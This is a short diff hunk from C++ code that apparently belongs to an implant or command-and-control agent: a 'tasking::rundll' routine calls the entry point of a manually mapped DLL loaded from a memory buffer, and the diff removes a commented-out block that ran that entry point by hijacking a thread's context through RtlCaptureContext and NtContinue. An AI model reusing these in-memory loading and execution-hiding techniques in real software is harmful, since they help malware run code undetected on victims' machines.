@@ -309,44 +309,7 @@ tasking::rundll(const std::string& file_buffer) {
 	fnDllMain pmain		= reinterpret_cast<fnDllMain>(dll.pMappedData + (dll.pImgNtHdrs->OptionalHeader.AddressOfEntryPoint));
 	pmain(nullptr, DLL_PROCESS_ATTACH, nullptr);
 
-	/*
-	void* pcapture_ctx	= GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "RtlCaptureContext");
-	void* pntcontinue   = GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtContinue");
-
-	if(!pmain || !pcapture_ctx || !pntcontinue) {
-		return "failed to get vital function addresses.";
-	}
 
 
-	//
-	// Note: these shennanigans MAY result in a crash.
-	//	I have not fully tested this, and it is unreliable at best. May change later.
-	//
-
-	if(!QueueUserWorkItem(
-		(LPTHREAD_START_ROUTINE)pcapture_ctx,
-		&ctx_cur_thread,
-		WT_EXECUTEDEFAULT
-	)) {
-		return "failed to queue work item.";
-	}
-
-	Sleep(0x32);
-	memcpy(&ctx_dllmain, &ctx_cur_thread, sizeof(CONTEXT));
-
-	ctx_dllmain.Rsp -= 8;
-	ctx_dllmain.Rip = reinterpret_cast<DWORD64>(pmain);
-	ctx_dllmain.Rcx = 0x00;
-	ctx_dllmain.Rdx = DLL_PROCESS_ATTACH;
-	ctx_dllmain.R8	= 0x00;
-
-	if(!QueueUserWorkItem(
-		(LPTHREAD_START_ROUTINE)pntcontinue,
-		&ctx_dllmain,
-		WT_EXECUTELONGFUNCTION
-	)) {
-		return "failed to queue work item.";
-	}
-	*/
 	return "success";
 }
